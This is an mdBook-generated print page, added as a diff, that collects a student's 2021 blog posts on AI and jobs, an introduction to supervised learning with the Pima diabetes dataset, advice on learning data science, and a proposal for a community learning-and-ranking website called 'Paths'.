+<p>Can Robots debate? Do they know the meaning of justice? They can follow a set of rules pretty well, but time and time again, we have faced many loop holes in our constitutions, that we have had to amend those rules to provide justice appropriately.</p>
+<p>AI doesn’t understand right and wrong, at-least according to me. Whatever has been right in the 20th century, may be utter injustice in the 21st century.</p>
+<p><strong>So, lawyers stick to your black coats.</strong></p>
+<p>I haven’t talked about everything yet, <strong>there is still a plethora of things that we can look forward to in the future.</strong></p>
+<p>The sheer amount of opportunities we have is growing extensively, but mind you, <strong>the need to be well-educated is becoming more and more important</strong>. We all know Newton didn’t learn Calculus in his high school and he didn’t even know about photo-electric effects of light.</p>
+<p><strong>We must accept it, when computers came to the world, they created more jobs than they destroyed and I assure you, it is going to be the case with AI as well.</strong></p>
+<blockquote>
+<h1 id="dont-try-to-learn-everything-learn-to-share-your-knowledge-with-others-and-when-others-do-the-same-we-will-be-able-to-make-amazing-things"><a class="header" href="#dont-try-to-learn-everything-learn-to-share-your-knowledge-with-others-and-when-others-do-the-same-we-will-be-able-to-make-amazing-things"><strong>Don’t try to learn everything, learn to share your knowledge with others, and when others do the same, we will be able to make amazing things.</strong></a></h1>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="saai-talks-data-science-2"><a class="header" href="#saai-talks-data-science-2">Saai talks Data Science #2</a></h1>
+<h1 id="date-2021-03-09"><a class="header" href="#date-2021-03-09"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-03-09</small></a></h1>
+<hr />
+<p>Machine Learning Introduction</p>
+<h3 id="what-is-the-difference-between-artificial-intelligence-and-machine-learning"><a class="header" href="#what-is-the-difference-between-artificial-intelligence-and-machine-learning">What is the difference between Artificial Intelligence and Machine Learning?</a></h3>
+<p><em><strong>Define Artificial Intelligence,</strong></em></p>
+<p>To be honest Artificial Intelligence can be defined in many ways.</p>
+<p>This is how IBM defines Artificial Intelligence…</p>
+<blockquote>
+<p>“Artificial intelligence refers to the ability of a computer or machine to mimic the capabilities of the human mind — learning from examples and experience, recognizing objects, understanding and responding to language, making decisions, solving problems — and combining these and other capabilities to perform functions a human might perform.” ¹</p>
+</blockquote>
+<p>This is a definition I found on the Stanford2016 AI100 report…</p>
+<blockquote>
+<p>“Artificial intelligence is that activity devoted to making machines intelligent, and intelligence is that quality that enables an entity to function appropriately and with foresight in its environment.” ²</p>
+</blockquote>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*JPvnlhd2zWUYFaATbi2Pfw.png" alt="" /></p>
+<p>According to the second definition of Artificial Intelligence, even a calculator can be considered to be intelligent, but the difference between it and the human-brain is scale, speed, degree of autonomy, and generality.</p>
+<p>The same factors can be used to evaluate every other instance of intelligence — speech recognition software, animal brains, cruise-control systems in cars, Go-playing programs, thermostats — and to place them at some appropriate location in the spectrum.</p>
+<p>Speech recognition software were designed for the sole purpose of recognizing speech and Go-playing programs were designed for the sole purpose of playing Go, they are not generalized and hence differ from an animal brain, which is much more complex in scale and is generalized, to perform various operations.</p>
+<p>Calculators are significantly faster than the average human brain in calculating complex mathematical values, but lacks in degree of autonomy.</p>
+<p>They won’t give you the output until you press the “Enter” key or the “=” key, but cruise-control systems in cars are have a greater degree of autonomy. Both come under the category of intelligence.</p>
+<p>So piece of code that is able to mimic human intelligence can be called artificial intelligence but they all vary in the degree of intelligence they have and can be categorized in this manner.</p>
+<p><em><strong>Define Machine Learning,</strong></em></p>
+<blockquote>
+<p>Machine Learning is a subset of artificial intelligence, which involves using data in order to increase the accuracy of the results generated by the algorithm, without human intervention in the process of learning from the data.</p>
+</blockquote>
+<p>Machine Learning algorithms optimize themselves to be better based on the data provided to them, you can note the clear line of difference here,</p>
+<p>Machine Learning Algorithms are a far more complex algorithms, which have a higher level of autonomy compared to a calculator, though both are artificially intelligent.</p>
+<p>They are used on a wide range of tasks such as scam filtering or computer vision.</p>
+<p><em><strong>Machine Learning can be divided into three classes :</strong></em></p>
+<ol>
+<li>
+<p>Supervised Learning</p>
+</li>
+<li>
+<p>Unsupervised Learning</p>
+</li>
+<li>
+<p>Reinforcement Learning</p>
+</li>
+</ol>
+<p><em><strong>Supervised Learning :</strong></em></p>
+<p>Supervised Learning refers to a class of Machine Learning the Algorithm learns to map a set of input features to a target variable.</p>
+<p>Mostly the need for supervised learning will occur if we have a defined set of features and a target variable like in the dataset given below.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*0mSZoJPEJxEjh5mjkVdKjA.png" alt="Pima Indian Diabetes Database⁴" /><em>Pima Indian Diabetes Database⁴</em></p>
+<blockquote>
+<p>Each row in the data-set represents a data sample, in our case each sample is a female at least 21 years old of Pima Indian heritage.
+Each Column represents a feature used to describe every person.</p>
+</blockquote>
+<p>For example,</p>
+<p>Patient 0 — has had 6 Pregnancies, Glucose level of 148, Blood Pressure of 72 and so on…</p>
+<blockquote>
+<h1 id="our-problem-statement-"><a class="header" href="#our-problem-statement-">Our problem statement —</a></h1>
+<h1 id="given-all-of-the-features-data-of-a-female-of-at-least-21-years-old-of-pima-indian-heritage-except-the-outcome-calculate-the-outcome"><a class="header" href="#given-all-of-the-features-data-of-a-female-of-at-least-21-years-old-of-pima-indian-heritage-except-the-outcome-calculate-the-outcome">Given all of the features data of a female of at least 21 years old of Pima Indian Heritage except the outcome. Calculate the outcome,</a></h1>
+</blockquote>
+<p>Outcome of 1 represents that the patient has diabetes, and 0 suggests that the person doesn’t have diabetes.</p>
+<p>So, we’re given the above dataset to train our machine learning model to perform this task.</p>
+<p>We start by splitting the dataset into features-target pairs.</p>
+<pre><code>features = ['Pregnancies','Glucose','BloodPressure','SkinThickness','Insulin','BMI','DiabetesPedigreeFunction','Age']
+
+target = ['Outcome']
+
+# for Patient 0 the feature-target pair will be:
+
+features = [6,148,72,35,0,33.6,0.627,50]
+target-label = [1]
+
+and so on for all other patients...
+</code></pre>
+<p>Our dataset consists of 5 rows, out of which we will use 3 to train the model. This data is called the training data.</p>
+<p>We reserve the remaining 2 columns in order to test the model’s accuracy in telling us whether the patient has diabetes or not. This data is called the testing data.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*vDFuZeSO2UgQ026tiIE7VQ.png" alt="" /></p>
+<p>The model takes the first features-label pair.</p>
+<p>Trains on it,and learns that for such and such values of features, the value of the target-label is…1 or 0 and so on…</p>
+<p>and then takes the second features-label pair and does the same on this too.</p>
+<p>In the end the model which has been exposed to 3 features label pairs knows to an extent how to map the features’ values to the value of the target.</p>
+<p>Then on the test data, we predict results for the model and check if the model has learnt how to map the features to the target(outcome) properly or not.</p>
+<p>If you have any feedback leave them in the comments, hope you are able to understand what I have written, if not post any doubt in the comments, I’ll try my best to answer them.</p>
+<p>[1] <a href="https://www.ibm.com/cloud/learn/what-is-artificial-intelligence">https://www.ibm.com/cloud/learn/what-is-artificial-intelligence</a></p>
+<p>[2]Nils J. Nilsson, *The Quest for Artificial Intelligence: A History of Ideas and Achievements *(Cambridge, UK: Cambridge University Press, 2010).</p>
+<p>[3]<a href="https://commons.wikimedia.org/wiki/File:AI-ML-DL.svg">*Original file: Avimanyu786 SVG version: Tukijaaliwa</a>, <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>, via Wikimedia Commons.*</p>
+<p>[4]Smith, J.W., Everhart, J.E., Dickson, W.C., Knowler, W.C., &amp; Johannes, R.S. (1988). <a href="http://rexa.info/paper/04587c10a7c92baa01948f71f2513d5928fe8e81">Using the ADAP learning algorithm to forecast the onset of diabetes mellitus</a>. <em>In Proceedings of the Symposium on Computer Applications and Medical Care</em> (pp. 261–265). IEEE Computer Society Press.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="saai-talks-data-science-1"><a class="header" href="#saai-talks-data-science-1">Saai talks Data Science #1</a></h1>
+<h1 id="date-2021-03-08"><a class="header" href="#date-2021-03-08"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-03-08</small></a></h1>
+<hr />
+<p>Ever looked at the spam folder in you e-mail and thought, “Woah!, how does this thing know if a mail is a spam or not?”.</p>
+<p>Natural Language Processing or on a broader perspective, Machine Learning and Deep Learning. Now, these words are often confused to be the same as Artificial Intelligence.</p>
+<p>“Data Science”, I am 99% sure you have heard this word before. That 1% is for people who were living under a cave all these years. If, you having been living under a cave, the upcoming series of posts should be able lay out you basics and get you started in this wonderful intersection of Statistics and Computer Science.</p>
+<p>Yeah, you heard it right! STATISTICS and also PROBABILITY, i.e MATHEMATICS, to be a good Data Scientist your Statistics skills should be top notch. Note that this is a required skill, but not the only skill. That is the reason why Statisticians find it easier to transition into Data Science jobs.</p>
+<blockquote>
+<p><strong>Apart from Mathematics, you might also have to learn -</strong></p>
+</blockquote>
+<ol>
+<li>
+<p><em>Machine Learning</em>— mostly math</p>
+</li>
+<li>
+<p><em>Deep Learning</em>— math again</p>
+</li>
+<li>
+<p><em>Big Data concepts ( Apache Hadoop and Apache Spark )</em> — an intermediate level of knowledge will suffice as of the hour I am writing this post.</p>
+</li>
+<li>
+<p><em>DBMS</em> — Database Management Systems (So, if you have been running away from SQL, FACE IT! )</p>
+</li>
+<li>
+<p><em>Data Visualization tools</em>— there are many wonderful tools like D3js, Plotly, Matplotlib , Seaborn</p>
+</li>
+<li>
+<p><em>Storytelling skills</em>— if you can talk about a bar chart for a minimum of 15 minutes non-stop! , you are good to go.</p>
+</li>
+<li>
+<p><em>Communication Skills</em> — So, that you don’t stare at the audience or in this case your clients or your employer.</p>
+</li>
+<li>
+<p><em>Ability to work in a team</em> — I don’t have to explain why this is important, you can’t manage an entire Hadoop Cluster, while making sure its secure, while analyzing the data while designing your neural network while communicating to your clients.</p>
+</li>
+<li>
+<p><em>Most important skill — Curiosity,</em> but don’t worry, humans were born with this, you will awaken your inner “Cat” soon enough.</p>
+</li>
+<li>
+<p>I almost forgot(literally), an <em>expert understanding of either Python or R</em>, you might find it difficult with any other languages, due to lack of community resources. In my posts, I will use python.</p>
+</li>
+</ol>
+<p>Data Science might sound like its easy, but the subject is vast, as of the ten points above, I am just scratching the surface…the learning never ends actually… so, by the time you retire, you will have huge skill-set, so…</p>
+<p>if you are in it for the money and do not really like the subject,</p>
+<blockquote>
+<p>“<em>Let me warn you, its not going to be a lot of fun.</em> <em>The Bandwagon won’t take you too far, unless you are super determined.”</em></p>
+</blockquote>
+<p>If you are genuinely interested in the subject though, carry on happily, you’ll definitely love this field.</p>
+<p>One more tip I would like to give you is, use open — source as much as possible, you can apply you knowledge in open — source tools easily in enterprise tools.</p>
+<p><strong>Why Open-Source?</strong></p>
+<p>Coz, it is the best thing that ever happened to humanity, the word shouts “Unity”. Take <strong>“Wikipedia”, the ultimate encyclopedia</strong>, it couldn’t have been made by one organization, let alone one person. Every single contributor of Wikipedia comes from <em>various countries, various backgrounds, various skill-sets</em> and yet its marvel stuns all!</p>
+<p>So every-time someone asks you why open-source is important, tell them,</p>
+<blockquote>
+<p><em>“What one man achieves in a year, a community achieves in a minute”</em></p>
+</blockquote>
+<p>IT’S FREE! Do you need a better reason?</p>
+<blockquote>
+<p><strong>Here are some excellent website every student of Data Science might wanna know of:</strong></p>
+</blockquote>
+<ol>
+<li>
+<p><a href="https://www.kaggle.com/">Kaggle</a></p>
+</li>
+<li>
+<p><a href="https://colab.research.google.com/notebooks/intro.ipynb">Google Colabs</a></p>
+</li>
+<li>
+<p><a href="https://www.youtube.com/c/Deeplearningai/featured">YouTube- DeepLearning.ai</a> — Take a moment to thank Andrew Ng and his wonderful team for making such top notch content free to watch. There are Coursera courses too, if you want to get certifications.</p>
+</li>
+</ol>
+<blockquote>
+<p><strong>Some, python libraries that are essential,</strong></p>
+</blockquote>
+<ol>
+<li>
+<p>Numpy</p>
+</li>
+<li>
+<p>Pandas</p>
+</li>
+<li>
+<p>SciPy</p>
+</li>
+<li>
+<p>Scikit Learn</p>
+</li>
+<li>
+<p>Matplotlib</p>
+</li>
+<li>
+<p>Seaborn</p>
+</li>
+<li>
+<p>TensorFlow (or) PyTorch — they are the leaders as of the time I am writing this post.</p>
+</li>
+</ol>
+<p>I have attached a few of the best resources and libraries I know, if you have anything in mind, do drop it in the comments.</p>
+<p>Hope you liked this post, thank you, drop any feedback you might have in the comments, I’ll make sure to fix any issues if you find any.</p>
+<p>Thank you…see ya!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="paths--a-way-into-the-future-for-everybody"><a class="header" href="#paths--a-way-into-the-future-for-everybody">Paths — A way into the future for everybody.</a></h1>
+<h1 id="date-2021-09-11"><a class="header" href="#date-2021-09-11"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-09-11</small></a></h1>
+<hr />
+<p>Disclaimer : This website does not exist, I just think it will be really cool if it does.</p>
+<p>Have you ever wondered how humankind is going to manage this super fast transition into the future.</p>
+<p>In the my last post I had emphasized on what is gonna happen, but I didn’t really give you my thoughts on what has to be done for us to make this a fruitful transition?</p>
+<p>When it comes to transitioning, the first and the foremost system that we must mend is how we gain knowledge.</p>
+<p>After some deep thinking and a lot of googling, I found out, that</p>
+<ol>
+<li>
+<p>Certificates are** super costly!!**</p>
+</li>
+<li>
+<p>College is** Costlier.**</p>
+</li>
+<li>
+<p>Everyone’s primary source of knowledge is ultimately YouTube.</p>
+</li>
+</ol>
+<p>So, there we have it, the answer, YouTube, or in a wider context, **free resources available on the Internet. **Yes, we do have to pay for the internet, but it is comparatively cheap when compared to the millions draining out of parent’s pockets!</p>
+<blockquote>
+<h1 id="woah-wait-up-what-are-you-saying-saai-you-are-asking-us-to-dropout-of-college-and-study-stuff-off-the-internet"><a class="header" href="#woah-wait-up-what-are-you-saying-saai-you-are-asking-us-to-dropout-of-college-and-study-stuff-off-the-internet">**Woah, **wait up! What are you saying Saai? You are asking us to dropout of college and study stuff off the Internet!!!</a></h1>
+</blockquote>
+<p>Well, not exactly my friends, let me explain, or rather, let me pitch an idea here, right on medium,</p>
+<h3 id="paths--a-way-into-the-future-"><a class="header" href="#paths--a-way-into-the-future-"><strong>Paths — A Way into the Future :</strong></a></h3>
+<p>There are tonnes of learning material on the Internet. Don’t lie, you use them more often than you know!</p>
+<p>Aside from the expense part, finding your niche is also becoming more and more difficult as jobs have become more intricate.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*l6mgQGlmkCFzwQmvj9W16A.jpeg" alt="" /></p>
+<p>All of a sudden you realise all your friends are doing something and you want to gain some skills apart from what college teaches you. After lots of asking around and being convincing by your friends and parents, you want to learn Data Science, all right,</p>
+<p><strong>Step 1:</strong> Go to any Ed Tech Platform, find a course that has the words “Complete”, “Full” or “End to End”.</p>
+<p><strong>Step 2:</strong> Finish their course and add the certificate they give on your resume.</p>
+<p><strong>Step 3:</strong> Try making projects and fail miserably a few times, before getting it right the 100th time after helping yourself with 100’s of google searches and stack overflow code. At this point, you are starting to doubt if the project is really yours at all.</p>
+<p>Even worse, you don’t try doing projects at all, because, you don’t have the equipment (or) you don’t have the time (or) Nobody told you!!</p>
+<p>Now, after <strong>Paths is implemented,</strong></p>
+<p>**Step 1: **Understand that the college courses only give you a foundation and that you need to get a deeper understanding of some subject or domain that you college is teaching you. Even, if it is not a part of your curriculum, it is alright. College courses are designed in such a way that it can help everyone, not just one person. Learn what you want to, try learning the other subjects too, they might help later on, because everything is interconnected.</p>
+<p><strong>Step 2:</strong> Go to the **Paths **website, and pick a Domain that you want to completely go into and master. Or even better, pick the subjects you like and the site tells you what jobs you are apt for.</p>
+<blockquote>
+<h1 id="the-best-jobs-you-can-get-are-the-ones-that-are-created-for-you--ivan-peppelnjak"><a class="header" href="#the-best-jobs-you-can-get-are-the-ones-that-are-created-for-you--ivan-peppelnjak">“The best jobs you can get are the ones that are CREATED for you” — Ivan Peppelnjak</a></h1>
+</blockquote>
+<p>**Step 3: **Now you know, what you wanna become, what you have to study(vaguely).</p>
+<p>You would have chosen Python, but, python is super huge, 1000’s of libraries and the versatility of the language is too great for you to fully learn it. If you want to do Data Science — Numpy and Pandas is key. If it is Web Development — Django and Flask come without saying. If it is Computer Vision — you will find yourself at the mercy of OpenCV and skimage. If it is… you get the point.</p>
+<p>Where do you start, the world runs on open-source and there are many open-source tools out there! What will you learn?</p>
+<p>You will use the syllabus that is provided on the Paths website for the domain you selected, and in that you will have a list of subjects and in that you will have a list of things you will have to study in that subject, of course the prerequisites will be included too.</p>
+<p>**Step 4: **Navigate to the website’s resources section, which is basically a thread containing all possible resources (links to Blogs, Books and YouTube Videos) for each topic in each subject. These resources are rated and is updated by the users. They are also Up voted and Down voted by the community.</p>
+<p>**Step 5: **After this the candidate becomes a **noob **in the subject. After this the ranks are upgraded by the rating other people give for his profile. This rating is more like us asking, “How is my GitHub?”.</p>
+<p>Yes, Paths has ranks for each member, 16 ranks to be precise.</p>
+<p>Not just GitHub, candidates can attach any website, like blogs, project videos etc.Why would people want to rate other people’s pages? Who would do this to who?How would they do this? I’ll come to this in a minute, now we will move on to the next step of your journey.</p>
+<p>Finish studying and rise in ranks and after 3 months minimum, get ready to write the first exam for entering the Professional rank, which is the 9th rank.</p>
+<p>To be ranked, you must pass a written exam, for a very small fee(less than 7$), but beware, if you fail the exam, you won’t be able to write it for the another 3 months. There is no workaround.</p>
+<p>This is to make sure the students actually prepare for the exam and actually study, because, time is as valuable as money. The pass conditions for the exam are strict, but not based on rank, it will be based on the difficulty of the paper.</p>
+<p>**Step 6: **Now, assume you have reached the <strong>“Professional”</strong> rank on Paths,</p>
+<p>You will get notified immediately as you reach the **Professional **Rank, because, this rank is the requirement for you to enter Paths —Bridge, which connects you to organizations that are posting vacancies on not just Paths, but other websites like Glass door, Indeed, etc. Paths will auto-apply with your resume (or you can toggle it to do this manually, in this case, you will only get notified).</p>
+<p>You can keep track of your applications, any interviews or task deadlines, will be added to your calendar**, **which will remind you 1 week, 3 days and 1 day prior to the task’s deadline. (Customizable)</p>
+<p>**Step 7: **You get a job, you are a <strong>Professional</strong>, but it doesn’t end here,</p>
+<p>Learning is a never ending process, and did I mention that **Professional **is only the 9th rank? Yes, There are 8 more ranks for you to climb. You will also be able to evaluate the papers of the students who write to get ranked in that domain.</p>
+<p>Don’t worry, the papers will go through multiple layers of evaluation and rejection is possible only if the first evaluator provides a proper reason and all the subsequent evaluators accept that the reason is sufficient to reject the paper.</p>
+<p>Nope, you do not have to correct them for free, you will get a part of the fee that was paid by the candidate, for each paper evaluated. <strong>First Evaluator</strong>, gets the maximum share.</p>
+<p>There are ways for your profile to get down-voted also, which means a fall in the ranks, which means, even if you are a “Professional”, you still face a risk of falling back to “Beginner”. So, keep updating your profile and learn new stuff.</p>
+<p>On the upside, you can progress in you work environment too,</p>
+<blockquote>
+<h1 id="learning-should-never-stop-if-you-want-success-dont-look-at-learning-as-a-part-of-you-college-or-school-life"><a class="header" href="#learning-should-never-stop-if-you-want-success-dont-look-at-learning-as-a-part-of-you-college-or-school-life">“Learning should never stop, if you want success, don’t look at learning as a part of you college or school life”</a></h1>
+</blockquote>
+<p>**Step 8 : **Help people, help the society advance, contribute to open-source projects, its not all about computers and academics. Help clean a local park or participate in a tree-plantation drive. Post them on the Paths website.</p>
+<p>Paths holds your data, true, but to an extent you are allowed to manage what goes to the analytics and what does not. Paths requires your data to improve its services and won’t sell it to data vendors.</p>
+<h3 id="the-system-"><a class="header" href="#the-system-">The System :</a></h3>
+<p>I have been making some wild claims as to what paths can do, though, I have minutely covered how it will do things, this section will hopefully clarify all of your doubts.</p>
+<p>I’ll go step by step in terms of doubts as well,</p>
+<p><strong>Step 2: Doubt 1: How can Paths know what career I like?</strong></p>
+<p>Honestly, Paths won’t, it cannot! Based on your likes and preferences in terms of subjects in the Paths Database and other hobbies. It suggests you a list of choices. Along with this, it also provides a complete definition of the domain, in terms of scope, salary, benefits, demerits, and also the syllabus for the domain and if possible we can try to include a list of the major industry players in the domain too.</p>
+<p>Paths will take the help of the community to create this database. Uses Analytics to suggest options and help you choose.</p>
+<p><strong>Step 2: Doubt 2: What if I want to change the Domain once I start?</strong></p>
+<p>A very good question, if you do have this question in your mind, it means you have started thinking about this.</p>
+<p>The syllabus is not a piece of paper, it is a check list, as you fill in each box in the check list, your career options in other domains open as well. For example, A candidate who wants to do Data Science, can transition to ML or AI Engineer Domains. You can also complete multiple domains.</p>
+<p>In case you want to work on a whole different field, which has no subjects in common with the one you are currently working on, you must restart with a new checklist.</p>
+<p>As you complete each subject, small tests are conducted to help you evaluate your proficiency.</p>
+<p><strong>Step 3: Doubt 1: What Domains? What Subjects? What Syllabus?</strong></p>
+<p>There are many domains, like Data Science, AI-ML Engineer etc, you have to complete the complete syllabus of that domain, which includes a set of subjects.</p>
+<p>Each subject has a list of topics, it is these topics that are kept track of by Paths, for helping you in case you wanna transition into other domains.</p>
+<p>This, is what the structure will look like,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*xZ0Pwtb1ZgNk6AqmgZK7Fw.png" alt="sudo apt install tree…lol" /><em>sudo apt install tree…lol</em></p>
+<p><strong>Step 5: Doubt 1: How does the ranking system work?</strong></p>
+<p>Now, I am obligated to tell you,</p>
+<p>Paths has 16 ranks, each rank has a set of basic tasks and additional tasks. Each task has a credit score.</p>
+<p>As you finish each task, you will add a link to it or an equivalent on Paths, a person in the ranks above you will up-vote or down-vote it. Once, you reach the assigned difference in votes (up-votes minus down-votes), your task will be considered accepted and you will be awarded the credits for that task.</p>
+<p>This credit score will get added to your Overall Credit Score (OCS), which includes the total of all the credit scores you achieved for all the ranks you have progressed through so far. It is possible for your OCS to go down if the number of down-votes increases and the difference in votes, goes below the assigned value. In this case the task that was previously accepted will be returned.</p>
+<p>You will have to complete the basic set of tasks in order to qualify for rank progression. If your OCS is higher than the person with the lowest OCS in the rank above yours, your rank will will progress and that person will come down to your rank.</p>
+<p>So, there are as many ways to rise as there are way to fall.</p>
+<p><strong>Step 5: Doubt 2: Why will someone rate my profile?</strong></p>
+<p>Well they will, since, for every profile you rate, someone will rate yours, and only that is possible. You could be sitting in India and rating a profile of someone in Uganda.</p>
+<p>Well, this is my idea, and I have come to the conclusion, that it has to be</p>
+<p>by the community — for the community — of the community of programmers.</p>
+<p>No one person or organization can pull this off. This idea is more of an imagination, and I hope it interests a group of people. If you are interested in implementing this idea, go ahead with it, but please don’t make any profit minded amendments to it. You do not have to ask me or anything. Consider the idea my contribution to the project.</p>
+<p>I am only a college student and might have made a few mistakes in the finances part, for this idea.</p>
+<p>Additional Readings —</p>
+<p><strong>OER :</strong> <a href="https://en.wikipedia.org/wiki/Open_educational_resources">https://en.wikipedia.org/wiki/Open_educational_resources</a></p>
+<p>**FCC : <a href="https://en.wikipedia.org/wiki/FreeCodeCamp">**https://en.wikipedia.org/wiki/FreeCodeCamp</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Free_education#On_the_Internet">https://en.wikipedia.org/wiki/Free_education#On_the_Internet</a></p>
+<p><a href="https://en.wikipedia.org/wiki/MIT_OpenCourseWare">https://en.wikipedia.org/wiki/MIT_OpenCourseWare</a></p>
+<p>A friend found a similar website online : <a href="https://launchschool.com/">https://launchschool.com/</a></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </div>
+    </body>
+</html>
